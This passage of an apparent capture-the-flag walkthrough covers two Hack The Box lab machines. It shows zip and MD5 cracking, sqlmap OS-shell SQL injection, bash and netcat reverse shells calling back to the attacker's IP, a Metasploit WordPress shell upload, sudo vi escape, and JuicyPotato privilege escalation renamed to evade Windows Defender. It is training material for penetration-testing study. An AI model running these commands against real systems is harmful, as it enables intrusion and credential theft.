</code></pre></td></tr></table>
</div>
</div><p>Let’s see what is in there:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"> Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2533 Feb 03 11:27 backup.zip
226 Directory send OK.

</code></pre></td></tr></table>
</div>
</div><p>A file named <strong>backup.zip</strong> is found in the folder. Let get the *.zip
file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">ftp&gt; get backup.zip
local: backup.zip remote: backup.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
226 Transfer complete.
2533 bytes received in 0.00 secs (1.1824 MB/s)
ftp&gt; 
741852963        (backup.zip)
</code></pre></td></tr></table>
</div>
</div><p>Extraction of the archive fails as it&rsquo;s password protected. The password
can be cracked using <strong>zip2john</strong>, <strong>JohntheRipper</strong> and
<strong>rockyou.txt</strong>.</p>
<p>The zip2john tool will be used to process the input ZIP files into an
<strong>hash</strong> format suitable for use with JohntheRipper</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">zip2john backup.zip &gt; hash
</code></pre></td></tr></table>
</div>
</div><p>The rockyou.txt file (with the passwords) is located here :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">locate rockyou.txt
/usr/share/wordlists/rockyou.txt.gz
</code></pre></td></tr></table>
</div>
</div><p>To extract the <strong>rockyou.txt.gz</strong> file we use the <strong>gunzip</strong> command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">gunzip /usr/share/wordlists/rockyou.txt.gz
</code></pre></td></tr></table>
</div>
</div><p>Now it is possible to use the <strong>JohntheRipper</strong> tool as sown below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">john  <span class="nb">hash</span>  --fork<span class="o">=</span><span class="m">4</span> -w<span class="o">=</span>/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64<span class="o">])</span>
Node numbers 1-4 of <span class="m">4</span> <span class="o">(</span>fork<span class="o">)</span>
Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
<span class="m">741852963</span>        <span class="o">(</span>backup.zip<span class="o">)</span>
<span class="m">1</span> 1g 0:00:00:00 DONE <span class="o">(</span>2020-07-03 11:33<span class="o">)</span> 100.0g/s 25600p/s 25600c/s 
.......
Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></td></tr></table>
</div>
</div><p>As we can see, the password for the backup.zip file is found to be
<strong>741852963</strong></p>
<p>Extracting it&rsquo;s contents using the password reveals a PHP file and a CSS
file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">unzip backup.zip 
Archive:  backup.zip
<span class="o">[</span>backup.zip<span class="o">]</span> index.php password: 
  inflating: index.php               
  inflating: style.css  
</code></pre></td></tr></table>
</div>
</div><p>Inspecting the PHP source code, we find a login check.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
session_start();
  if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) {
    if($_POST[&#39;username&#39;] === &#39;admin&#39; &amp;&amp; md5($_POST[&#39;password&#39;]) === &#34;2cb42f8734ea607eefed3b70af13bbd3&#34;) {
      $_SESSION[&#39;login&#39;] = &#34;true&#34;;
      header(&#34;Location: dashboard.php&#34;);
    }
  }
?&gt;

</code></pre></td></tr></table>
</div>
</div><p>The input password is hashed into a MD5 hash:
<strong>2cb42f8734ea607eefed3b70af13bbd3</strong>. T</p>
<p>This hash can be easily cracked using an online rainbow table such as
crackstation.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image79.png"></div>
<p>The result is : <strong>qwerty789</strong></p>
<h3 id="9702-foothold-2">◦ Foothold</h3>
<p>======================</p>
<p>Browsing to port 80, we can see a login page for MegaCorp.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image80.png"></div>
<p>The credentials <strong>admin / qwerty789</strong> can be used to login.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image81.png"></div>
<p>The page is found to host a Car Catalogue, and contains functionality to
search for products.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image82.png"></div>
Searching for example fo the term “a”, results in the following request.
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://10.10.10.46/dashboard.php?search=a
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image83.png"></div>
<p>The page takes in a GET request with the parameter search. This URL is
supplied to sqlmap, in order to test for SQL injection vulnerabilities.
The website uses cookies, which can be specified using &ndash;cookie.</p>
<p>Right-click the page and select Inspect Element. Click the Storage tab
and copy the PHP Session ID.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image84.png"></div>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image85.png"></div>
<p>WE see the PHPSESSID value is :&quot;<strong>gub9n3ugpgc5obsre8jkv8tq3m</strong>&quot;</p>
<p>We can construct the Sqlmap query as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">sqlmap -u <span class="err">&#39;</span>http://10.10.10.46/dashboard.php?search<span class="o">=</span>a’--cookie<span class="o">=</span><span class="s2">&#34;PHPSESSID=gub9n3ugpgc5obsre8jkv8tq3m&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>Sqlmap found the page to be vulnerable to multiple injections, and
identified the backend DBMS to be PostgreSQL.</p>
<p><em><strong>Getting code execution in postgres is trivial using the &ndash;os-shell command.</strong></em></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">sqlmap -u <span class="s1">&#39;http://10.10.10.46/dashboard.php?search=a&#39;</span> --cookie<span class="o">=</span><span class="s2">&#34;PHPSESSID=gub9n3ugpgc5obsre8jkv8tq3m&#34;</span> --os-shell 
....
<span class="o">[</span>*<span class="o">]</span> starting @ 15:32:32 /2020-07-03/
....
....
Parameter: search <span class="o">(</span>GET<span class="o">)</span>
....
    Title: PostgreSQL &gt; 8.1 stacked queries <span class="o">(</span>comment<span class="o">)</span>
    Payload: <span class="nv">search</span><span class="o">=</span>a<span class="s1">&#39;;SELECT PG_SLEEP(5)--
</span><span class="s1">
</span><span class="s1">    Type: time-based blind
</span><span class="s1">    Title: PostgreSQL &gt; 8.1 AND time-based blind
</span><span class="s1">    Payload: search=a&#39;</span> AND <span class="nv">8079</span><span class="o">=(</span>SELECT <span class="m">8079</span> FROM PG_SLEEP<span class="o">(</span>5<span class="o">))</span>-- dEyh
....
....
<span class="o">[</span>15:32:34<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> going to use <span class="s1">&#39;COPY ... FROM PROGRAM ...&#39;</span> <span class="nb">command</span> execution
<span class="o">[</span>15:32:34<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> calling Linux OS shell. To quit <span class="nb">type</span> <span class="s1">&#39;x&#39;</span> or <span class="s1">&#39;q&#39;</span> and press ENTER
os-shell&gt; 
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image86.png"></div>
<h3 id="9702-privilege-escalation">◦ Privilege Escalation</h3>
<p>This can be used to execute a shell  reverse shell .</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash  -c  <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/&lt;your_ip&gt;/4444 0&gt;&amp;1&#39;</span>
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image87.png"></div>
<p>Let&rsquo;s upgrade to a tty shell  and continue enumeration.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="nv">SHELL</span><span class="o">=</span>/bin/bash script -q /dev/null
</code></pre></td></tr></table>
</div>
</div><p>Let’s have a look to the source code of dashboard.php in /var/www/html.</p>
<p>The code reveals the postgres password to be: <strong>P@s5w0rd!</strong></p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image88.png"></div>
<p>This password can be used to view the user&rsquo;s sudo privileges.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image89.png"></div>
<p>The user is allowed to edit the configuration <strong>/etc/postgresql/11/main/pg_hba.conf</strong> using vi.
This can be leveraged to gain a root shell and access root.txt.
Once opened the file in “<em>Vi</em>” editor with sudo, we can try to spawn a TTY shell from within vi by typing one of the following command (link):
•	: ! bash<br>
•	: set shell=/bin/bash:shell
•	: ! /bin/bash</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image90.png"></div>
<p>As we can see, now we have a TTY as root.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image91.png"></div>
<h2 id="9656-shield">▸ SHIELD</h2>
<h3 id="9702-about-2">◦ About</h3>
<p>This box features only a root flag. Don&rsquo;t waste your time on finding the user.txt - until this is corrected by the Dev Team. I&rsquo;ve raised this issue already, so this article will be updated accordingly when status is changed. UPDATE: Apparently this is solved right now and information &ldquo;No Flag&rdquo; for user flag is shown correctly both for Shield and Vaccine.</p>
<ul>
<li>Machine : <b>Shield</b> </li>
<li>Ip: <b>10.10.10.29</b></li>
</ul>
<h3 id="9702-enumeration-1">◦ Enumeration</h3>
<p>======================</p>
<p><em><strong>sudo nmap -sC -sV 10.10.10.29</strong></em></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-07-09 12:59 EDT
Nmap scan report <span class="k">for</span> 10.10.10.29
Host is up <span class="o">(</span>0.044s latency<span class="o">)</span>.
Not shown: <span class="m">998</span> filtered ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
<span class="p">|</span> http-methods: 
<span class="p">|</span>_  Potentially risky methods: TRACE
<span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="p">|</span>_http-title: IIS Windows Server
3306/tcp open  mysql   MySQL <span class="o">(</span>unauthorized<span class="o">)</span>
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</code></pre></td></tr></table>
</div>
</div><p>From the Nmap output, we find that <strong>IIS</strong> and <strong>MySQL</strong> are running on
their default ports. IIS (Internet Information Services) is a Web Server
created by Microsoft. Let&rsquo;s navigate to port 80 using a browser.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image92.png"></div>
<p>We see the default IIS starting page.</p>
<p>Let&rsquo;s use GoBuster to scan for any sub-directories or files that are
hosted on the server.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image93.png"></div>
<p>We do found the “/<strong>wordpress”</strong> folder.</p>
<p>WordPress is a Content Management System (CMS) that can be used to
quickly create websites and blogs.</p>
<p>Let’s do another search using “dirsearch” and pointing directly to that
folder</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image94.png"></div>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image95.png"></div>
<p>We do see some interesting folder and files.</p>
<p>Since we have already acquired the password <strong>P@s5w0rd!,</strong> we can try to
login to the WordPress site.</p>
<p>We navigate to http://10.10.10.29/wordpress/wp-login.php and try to
guess the username.</p>
<p>Some common usernames are <strong>admin</strong> or <strong>administrator</strong>.</p>
<p>The combination <strong>admin</strong> : <strong>P@s5w0rd!</strong> is successful and we gain
administrative access to the site.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image96.png"></div>
<h3 id="9702-foothold-3">◦ Foothold</h3>
<p>The administrative access can be leveraged through the msfmodule
<strong>“exploit/ unix/webapp/wp_admin_shell _upload”</strong>, to get a
meterpreter shell  on the system. Let’s follow the following commands in
order to get a session:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">msfconsole
msf &gt; use exploit/unix/webapp/wp_admin_shell_upload
msf &gt; set PASSWORD P@s5w0rd!
msf &gt; set USERNAME admin
msf &gt; set TARGETURI /wordpress
msf &gt; set RHOSTS 10.10.10.29
msf &gt; run
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image97.png"></div>
<br>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image98.png"></div>
<p>Now that we got a meterpreter shell , we can use netcat (nc.exe) tp get a
more stable shell .</p>
<p>So let’s locate the binary.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image99.png"></div>
<p>Let’s copy <strong>nc.exe</strong> into our “Tools” directory</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image100.png"></div>
<br>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image101.png"></div>
<p>From within the meterpeter session, let’s move to oyr local Toolsdirectory</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali: ~/HTB/StartingPoint/Tools $ pwd
/home/kali/HTB/StartingPoint/Tools
</code></pre></td></tr></table>
</div>
</div><!-- <div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image102.png"></div> -->
<p>We can use the <strong>lcd</strong> command ( <strong>lcd</strong> stands for &ldquo;<strong>Local Change
Directory</strong>&rdquo;, which we use to navigate to the local folder where
<em>nc.exe</em> is located.)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter  &gt;  lcd
Usage:  lcd  directory
</code></pre></td></tr></table>
</div>
</div><!--  <div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image103.png"></div> -->
<p>So, let’s move to the “<strong>/home/kali/HTB/StartingPoint/Tools</strong>” folder wherethe “nc.exe” binary is located</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter  &gt;  lcd  /home/kali/HTB/StartingPoint/Tools
</code></pre></td></tr></table>
</div>
</div><!--<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image104.png"></div>
-->
<p>We then navigate to a writeable directory on the server (in our case
<strong>C:/inetpub/wwwroot/wordpress/wp-content/upload</strong>s) and upload netcat.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image105.png"></div>
<p>The command to use is the “upload” command: <strong>upload nc.exe</strong></p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image106.png"></div>
<p>We can see now the nc.exe program in the “upload” folder</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image107.png"></div>
<h3 id="9702-using-netcat">◦ <em><strong>Using Netcat</strong></em></h3>
<p>On another terminal we can now launch a listener</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kali@kali: ~/HTB/StartingPoint/Tools $  nc –lvp <span class="m">1234</span>
listening  on  <span class="o">[</span>any<span class="o">]</span>  <span class="m">1234</span> …
</code></pre></td></tr></table>
</div>
</div><!--<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image108.png"></div>
-->
<p>Next, we can execute the meterpeter followinginto the meterpreter session</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">meterpreter  &gt;  execute  -f  nc.exe  -a  &#34;-e  cmd.exe  10.10.14.16  1234&#34;
</code></pre></td></tr></table>
</div>
</div><!--
``` shell 
10077/rwxrwxrwx  59392  fil  2020-07-12  15:23:12  -0400  nc.exe
meterpreter  >  pwd
C:\inetpub\wwwroot\wordpress\wp-content\uploads
meterpreter  >  execute  -f  nc.exe  -a  "-e  cmd.exe  10.10.14.16  1234"
Process  632  created.
```
-->
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image109.png"></div>
<p>And we get a netcat shell :</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image110.png"></div>
<h3 id="9702-privilege-escalation-1">◦ Privilege Escalation</h3>
<p>======================</p>
<p>Running the “<strong>sysinfo</strong>” command on the meterpreter session, we notice
that this is a Windows Server 2016 OS, which is vulnerable to the
<em>Rotten Potato</em> exploit.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image111.png"></div>
<p>Let’s download the “<strong>JuicyPotato.exe</strong>” binary frome here :
<em><a href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe" target="_blank" rel="noopener noreffer">https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</a></em></p>
<p>Let’s save the binary into our “<strong>Tools”</strong> folder</p>
<div style="width:100%; background-color:#252b34;text-align: left;border: 1px solid black;" ><img width="40%"  src="media/image112.png"></div>
<p><em><strong>NOTE:</strong></em> Sometimes browser does not allow the download</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image113.png"></div>
<p>In this situation we can use the following command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">sudo  wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
</code></pre></td></tr></table>
</div>
</div><p>Then with the lcd command we move to the “<strong>Tools”</strong> folder from the
meterpreter shell  and we procede with the upload of the
“JuicyPotato.exe” into the “<strong>uploads”</strong> folder.</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image114.png"></div>
<p><em><strong>NOTE:</strong></em> We will have to rename the Juicy Potato executable to
something else, otherwise it will be picked up by Windows Defender.</p>
<p><em>From the meterpeter session we can use this command:</em></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">mv  JuicyPotato.exe  js.exe
</code></pre></td></tr></table>
</div>
</div><!--
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image115.png"></div>
-->
<p>From the reverse shell  on a Windows Machine we can use this command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rename  JuicyPotato.exe  js.exe
</code></pre></td></tr></table>
</div>
</div><!--
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image116.png"></div>
-->
<p>Below the executed command</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\w</span>ordpress<span class="se">\w</span>p-content<span class="se">\u</span>ploads&gt; rename  JuicePotatao.exe  js.exe
Rename JuicePotato.exe js.exe
</code></pre></td></tr></table>
</div>
</div><!--
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image117.png"></div>
-->
<!--
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image118.png"></div>
-->
<!--
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image119.png"></div>
-->
<p>From our shell , we can create a batch file that will be executed by the
exploit, and return a SYSTEM shell . Let&rsquo;s add the following contents to
<em><strong>shell .bat</strong></em>:
Below the executed command</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> START C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\w</span>ordpress<span class="se">\w</span>p-content<span class="se">\u</span>ploads<span class="se">\n</span>c.exe -e powershell.exe 10.10.14.2 <span class="m">1111</span> &gt; shell.bat
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\w</span>ordpress<span class="se">\w</span>p-content<span class="se">\u</span>ploads&gt;dir
dir

….
07/13/2020   11:55  AM                              <span class="m">98</span> shell.bat
….
….
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s start, from another terminal, another netcat listener:</p>
<div style="width:100%; background-color:#252b34;text-align: left;;border: 1px solid black;" ><img width="40%"  src="media/image120.png"></div>
<p>Next, we execute the netcat shell  using the JuicyPotato binary(js.exe):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">kali@kali:$ js.exe -t * -p C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\w</span>ordpress<span class="se">\w</span>p-content<span class="se">\u</span>ploads<span class="se">\s</span>hell.bat -l <span class="m">1337</span>
</code></pre></td></tr></table>
</div>
</div><div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image121.png"></div>
<p><em><strong>NOTE:</strong></em> if our payload is not working, we can use another CLSID</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">Option to add : -c <span class="o">{</span>bb6df56b-cace-11dc-9992-0019b93a3a84<span class="o">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Now on the listener terminal we have a shell  as “<strong>nt
authority\system</strong>”</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image122.png"></div>
<p>And we can have access to the <strong>“root.txt”</strong> file</p>
<div style="width:100%; background-color:#252b34;text-align: center;;border: 1px solid black;" class="zoom"><img width="50%"  src="media/image123.png"></div>
<h3 id="9702-post-exploitation">◦ Post Exploitation</h3>
<p>===================</p>
<p>We can now try to dump cache password. using a tool named “<strong>Mimikatz”</strong></p>
